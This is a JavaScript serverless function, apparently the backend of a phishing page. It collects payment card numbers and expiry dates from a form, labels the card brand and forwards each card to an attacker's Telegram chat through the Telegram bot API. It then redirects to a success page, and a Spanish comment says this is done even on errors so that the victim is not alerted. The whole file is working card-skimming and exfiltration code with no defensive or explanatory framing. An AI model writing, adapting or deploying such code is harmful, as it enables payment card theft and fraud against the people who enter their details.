const https = require('https');

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Location': '/success.html'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    try {
        // Parsear los datos del formulario
        const params = new URLSearchParams(event.body);
        const cardNumber = params.get('cc-number') || '';
        const expMonth = params.get('cc-exp-month') || '';
        const expYear = params.get('cc-exp-year') || '';

        // Configuración de Telegram
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.error('Faltan variables de entorno de Telegram');
        } else {
            // Detectar tipo de tarjeta
            const cleanNum = cardNumber.replace(/\s/g, '');
            let cardType = '💳 CARD';
            if (/^4/.test(cleanNum)) {
                cardType = '💳 VISA';
            } else if (/^5[1-5]/.test(cleanNum) || /^2(2[2-9]|[3-6]|7[0-1]|720)/.test(cleanNum)) {
                cardType = '💳 MASTERCARD';
            } else if (/^3[47]/.test(cleanNum)) {
                cardType = '💳 AMEX';
            }

            // Crear mensaje con mejor formato
            const fecha = new Date().toLocaleString('es-ES', { 
                timeZone: 'America/Argentina/Buenos_Aires',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });

            const message = `🔔 *NUEVA TARJETA ASOCIADA*\n\n${cardType}\n\n*Número:*\n\`${cardNumber}\`\n\n*Vencimiento:*\n\`${expMonth}/${expYear}\`\n\n*Fecha y Hora:*\n${fecha}`;

            // Enviar a Telegram
            await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
        }

        // Redirigir a página de éxito
        return {
            statusCode: 303,
            headers,
            body: ''
        };
    } catch (error) {
        console.error('Error:', error);
        // Redirigir igualmente para no alertar al usuario
        return {
            statusCode: 303,
            headers,
            body: ''
        };
    }
};

function sendToTelegram(botToken, chatId, message) {
    return new Promise((resolve, reject) => {
        const data = JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        });

        const options = {
            hostname: 'api.telegram.org',
            path: `/bot${botToken}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': data.length
            }
        };

        const req = https.request(options, (res) => {
            let response = '';
            res.on('data', (chunk) => response += chunk);
            res.on('end', () => resolve(response));
        });

        req.on('error', (error) => reject(error));
        req.write(data);
        req.end();
    });
}
